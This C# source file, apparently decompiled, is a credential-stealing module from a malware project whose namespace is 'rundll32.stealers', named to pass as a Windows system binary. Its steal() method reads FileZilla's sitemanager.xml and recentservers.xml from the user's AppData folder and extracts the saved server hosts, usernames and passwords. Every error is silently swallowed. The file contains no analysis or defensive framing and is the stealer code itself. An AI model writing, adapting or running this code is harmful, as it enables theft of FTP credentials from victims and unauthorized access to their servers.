using System;
using System.Collections.Generic;
using System.IO;

namespace rundll32.stealers;

internal class fz
{
	public struct fzEntry
	{
		public string host;

		public string user;

		public string pass;
	}

	private static string[] MagicSplit(string source, string expr)
	{
		List<string> list = new List<string>();
		list.Add(source.Substring(0, source.IndexOf(expr)));
		string text = source.Substring(source.IndexOf(expr) + expr.Length);
		while (text.Contains(expr))
		{
			list.Add(text.Substring(0, text.IndexOf(expr)));
			text = text.Substring(text.IndexOf(expr) + expr.Length);
		}
		list.Add(text);
		return list.ToArray();
	}

	public static fzEntry[] steal()
	{
		List<fzEntry> list = new List<fzEntry>();
		try
		{
			try
			{
				string source = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\sitemanager.xml");
				string[] array = MagicSplit(source, "<Server>");
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Contains("<Host>"))
					{
						fzEntry item = default(fzEntry);
						item.host = text.Substring(text.IndexOf("<Host>") + 6, text.IndexOf("</Host>") - (text.IndexOf("<Host>") + 6));
						item.user = text.Substring(text.IndexOf("<User>") + 6, text.IndexOf("</User>") - (text.IndexOf("<User>") + 6));
						item.pass = text.Substring(text.IndexOf("<Pass>") + 6, text.IndexOf("</Pass>") - (text.IndexOf("<Pass>") + 6));
						list.Add(item);
					}
				}
			}
			catch
			{
			}
			try
			{
				string source2 = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml");
				string[] array3 = MagicSplit(source2, "<Server>");
				string[] array4 = array3;
				foreach (string text2 in array4)
				{
					if (text2.Contains("<Host>"))
					{
						fzEntry item2 = default(fzEntry);
						item2.host = text2.Substring(text2.IndexOf("<Host>") + 6, text2.IndexOf("</Host>") - (text2.IndexOf("<Host>") + 6));
						item2.user = text2.Substring(text2.IndexOf("<User>") + 6, text2.IndexOf("</User>") - (text2.IndexOf("<User>") + 6));
						item2.pass = text2.Substring(text2.IndexOf("<Pass>") + 6, text2.IndexOf("</Pass>") - (text2.IndexOf("<Pass>") + 6));
						list.Add(item2);
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
		return list.ToArray();
	}
}
